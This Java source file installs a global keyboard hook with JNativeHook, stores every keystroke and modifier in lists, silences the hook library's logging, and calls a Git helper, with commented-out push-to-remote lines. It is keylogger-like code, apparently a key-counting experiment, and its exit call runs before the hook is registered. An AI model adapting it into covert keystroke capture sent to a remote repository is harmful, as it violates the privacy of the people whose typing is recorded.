package com.juan.del.rey.tercero.Last;

import java.io.IOException;
import java.net.URISyntaxException;
import java.util.ArrayList;
import java.util.logging.Level;
import java.util.logging.Logger;

import org.eclipse.jgit.api.errors.GitAPIException;
import org.eclipse.jgit.api.errors.NoFilepatternException;
import org.jnativehook.GlobalScreen;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.jnativehook.mouse.NativeMouseEvent;

/*Primero se implementará la interfaz que contiene los métodos necesarios para el
 * manejo de las teclas según su comportamiento
 */
// http://www.forosdelweb.com/f45/como-puedo-contar-las-teclas-clicks-con-jnativehook-1124564/
public class MouseKeyListener implements NativeKeyListener {
  /** */
  ArrayList<String> charr = new ArrayList<String>();

  ArrayList<String> withMod = new ArrayList<String>();

  public static void main(String[] args) throws Exception {

    try {
      GitControl.todo();
//      GitControl gc = new GitControl("", "");
//      gc.addToRepo();
//      //Commit with a custom message
//      gc.commitToRepo("Modified testfile.txt");
//      //Push commits
//      gc.pushToRepo();
    System.exit(1);
    } catch (IOException e1) {
     System.err.println(e1.getMessage() +"  ERROR"); 
   
    }
    
    try {
      Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
      logger.setLevel(Level.OFF);

      // Don't forget to disable the parent handlers.
      logger.setUseParentHandlers(false);
      GlobalScreen.registerNativeHook();
      MouseKeyListener myMouseListener = new MouseKeyListener();

      GlobalScreen.addNativeKeyListener(myMouseListener);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  // El método que se utilizará por ahora es nativeKeyPressed:
  public void nativeKeyPressed(NativeKeyEvent e) {
    String modifier = "";
    if (!e.getModifiersText(e.getModifiers()).equalsIgnoreCase("")) {
      modifier = "  :  " + e.getModifiersText(e.getModifiers());
    }
    System.out.println(e.getKeyText(e.getKeyCode()) + modifier);
    withMod.add(e.getKeyText(e.getKeyCode()) + modifier);
  }

  public void nativeKeyTyped(NativeKeyEvent e) {
    // TODO Auto-generated method stub
    System.out.println(String.valueOf(e.getKeyChar()) + "   chara");
    charr.add(String.valueOf(e.getKeyChar()));
  }

  public void nativeKeyReleased(NativeKeyEvent e) {}

  public void nativeMouseClicked(NativeMouseEvent arg0) {}

  public void nativeMousePressed(NativeMouseEvent arg0) {}

  public void nativeMouseReleased(NativeMouseEvent arg0) {}
}
